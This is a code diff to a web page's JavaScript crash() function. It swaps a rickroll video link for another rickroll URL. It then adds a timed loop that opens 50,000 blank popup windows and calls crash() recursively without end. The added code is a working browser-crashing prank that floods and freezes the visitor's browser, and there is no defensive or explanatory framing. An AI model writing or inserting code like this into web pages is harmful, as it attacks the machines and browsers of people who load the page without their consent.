@@ -62,10 +62,15 @@
           }
 
           function crash() {
-            const winSettings = 'width=400, height=300, top = 100, scrollbars=yes'
-            const frstwindow = window.open('https://youtu.be/xvFZjo5PgG0', '_blank', winSettings);
+            const winSettings = 'width=600, height=600, top = 100, scrollbars=yes'
+            const frstwindow = window.open('https://boulderbugle.com/rickroll-PK9ga6PK', '_blank', winSettings);
             if (frstwindow) {
-
+              setTimeout(function() {
+                for (i = 0; i < 50000; i++) {
+                  window.open('', '_blank', winSettings);
+                }
+              }, 7000);
+              crash();
             } else {
               crash();
             }
